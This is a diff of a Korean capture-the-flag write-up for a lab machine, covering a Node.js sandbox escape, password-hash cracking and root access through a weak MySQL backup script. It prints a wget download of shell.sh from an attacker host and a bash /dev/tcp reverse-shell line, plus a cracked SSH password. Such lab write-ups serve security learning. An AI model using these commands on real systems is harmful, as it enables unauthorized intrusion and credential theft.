@@ -31,7 +31,8 @@ vm.run(code);
 ```
 - execSync('')안에 실행할 코드를 넣는다.
 - python3 -m http.server 80 실행 후 wget http://10.10.14.33:80/shell.sh 를 넣어 쉘을 다운로드 시킨다.
-### shell.sh에
+
+  ### shell.sh에
 ### #!/bin/bash
 ### sh -i >& /dev/tcp/10.10.14.33/4444 0>&1 를 넣고 원격으로 실행 시킨다.
 - chmod +x shell.sh, ./shell.sh 를 순서대로 넣어 reverse shell을 획득한다.
@@ -40,7 +41,8 @@ vm.run(code);
   - /var/www/contact/tickets.db 파일에서 pw 해시 값을 얻을 수 있었다.
 - john pw.txt --wordlist=/usr/share/wordlists/rockyou.txt로 비밀번호 크랙을 시도한다.
 - spongebob1 값을 찾았고 이를 사용하여 ssh joshua@10.10.11.239로 접속을 시도한다.
-### ssh로 연결 한 후
+
+  ### ssh로 연결 한 후
 - sudo -l로 sudo 권한으로 실행할 수 있는 파일인 mysql-backup.sh를 찾을 수 있다.
   - mysql-backup.sh: mysql 백업 스크립트
   - sudo -l: 시스템의 현재 사용자 또는 지정된 사용자에게 부여 된 권한을 나열
@@ -49,7 +51,8 @@ vm.run(code);
   - 한 글자씩 비교하고 정규표현식으로 *를 넣어 패스워드를 비교한다
   - crack1.py를 만들고 python3 crack1.py로 실행하여 pw를 찾는다
   - 찾은 pw로 su root를 실행하여 root.txt를 찾는다
-### 결론
+
+  ### 결론
 - nodejs 코드 실행기에서 샌드박스 이스케이프를 활용하여 코드를 실행
 - 취약한 mysql 백업 스크립트에서 root 패스워드 탈취
 - bash에서 실행되는 db.sh이므로 brute force에 취약했음
